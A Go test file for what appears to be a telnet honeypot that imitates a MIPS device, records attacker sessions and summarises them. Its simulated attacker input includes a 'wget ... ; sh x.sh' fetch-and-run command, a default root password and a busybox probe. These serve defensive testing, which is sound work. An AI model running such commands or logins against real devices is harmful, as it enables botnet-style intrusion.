package persona

import (
	"bufio"
	"fmt"
	"net"
	"strings"
	"testing"
	"time"
)

func TestVisitIsRecordedNotExecuted(t *testing.T) {
	done := make(chan Session, 1)
	m := New(func(s Session) { done <- s })
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Skip("no loopback networking here")
	}
	port := ln.Addr().(*net.TCPAddr).Port
	ln.Close()
	if err := m.open(fmt.Sprintf("127.0.0.1:%d", port), port); err != nil {
		t.Fatal(err)
	}
	defer m.CloseAll()
	if m.open(fmt.Sprintf("127.0.0.1:%d", port), port) == nil {
		t.Error("opened the same port twice")
	}

	c, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), time.Second)
	if err != nil {
		t.Fatal(err)
	}
	c.SetDeadline(time.Now().Add(5 * time.Second))
	r := bufio.NewReader(c)
	until := func(mark string) string {
		var got strings.Builder
		for !strings.HasSuffix(got.String(), mark) {
			b, err := r.ReadByte()
			if err != nil {
				t.Fatalf("waiting for %q, got %q: %v", mark, got.String(), err)
			}
			got.WriteByte(b)
		}
		return got.String()
	}
	send := func(s string) { fmt.Fprint(c, s+"\r\n") }
	until("login: ")
	send("\xff\xfb\x01admin") // telnet option bytes in front of the name
	until("Password: ")
	send("hunter2-secret")
	if out := until("login: "); !strings.Contains(out, "Login incorrect") {
		t.Errorf("first attempt was not refused: %q", out)
	}
	send("root")
	until("Password: ")
	send("xc3511")
	until("# ")
	send("uname -a")
	if out := until("# "); !strings.Contains(out, "mips GNU/Linux") {
		t.Errorf("uname reply = %q", out)
	}
	send("wget http://203.0.113.9/x.sh; sh x.sh")
	if out := until("# "); !strings.Contains(out, "Network is unreachable") {
		t.Errorf("wget reply = %q", out)
	}
	send("touch /tmp/netwatch-persona-proof")
	if out := until("# "); !strings.Contains(out, "touch: not found") {
		t.Errorf("unknown command reply = %q", out)
	}
	send("exit")
	c.Close()

	var s Session
	select {
	case s = <-done:
	case <-time.After(3 * time.Second):
		t.Fatal("no session recorded")
	}
	all := ""
	for _, l := range s.Lines {
		all += l.Dir + ":" + l.Text + "\n"
	}
	if strings.Contains(all, "hunter2") || strings.Contains(all, "xc3511") {
		t.Errorf("a password was recorded:\n%s", all)
	}
	for _, want := range []string{"in:login admin / (14 characters)", "in:login root / (6 characters)", "in:uname -a", "in:wget http://203.0.113.9/x.sh; sh x.sh"} {
		if !strings.Contains(all, want) {
			t.Errorf("transcript lacks %q:\n%s", want, all)
		}
	}
	if len(s.Users) != 2 || !strings.Contains(s.Summary, "2 login attempt(s) as admin, root") || !strings.Contains(s.Summary, "download") || !strings.Contains(s.Summary, "looked around") {
		t.Errorf("summary = %q users = %v", s.Summary, s.Users)
	}
	if len(m.Sessions()) != 1 || m.Sessions()[0].Source != "127.0.0.1" {
		t.Errorf("sessions = %+v", m.Sessions())
	}
}

func TestScriptAndSummary(t *testing.T) {
	if r, ok := reply("/bin/busybox ECCHI"); !ok || r != "ECCHI: applet not found" {
		t.Errorf("busybox probe reply = %q", r)
	}
	if _, ok := reply("nmap -sS 10.0.0.0/8"); ok {
		t.Error("the script claims to know nmap")
	}
	bot := Session{Start: 0, End: 900, Users: []string{"root"}, Lines: []Line{{0, "in", "login root / (5 characters)"}, {0, "in", "login root / (6 characters)"},
		{0, "in", "enable"}, {0, "in", "system"}, {0, "in", "shell"}, {0, "in", "/bin/busybox ECCHI"}}}
	if s := Summarise(bot); !strings.Contains(s, "automated bot") {
		t.Errorf("bot summary = %q", s)
	}
	if s := Summarise(Session{}); !strings.Contains(s, "without typing") {
		t.Errorf("empty summary = %q", s)
	}
}
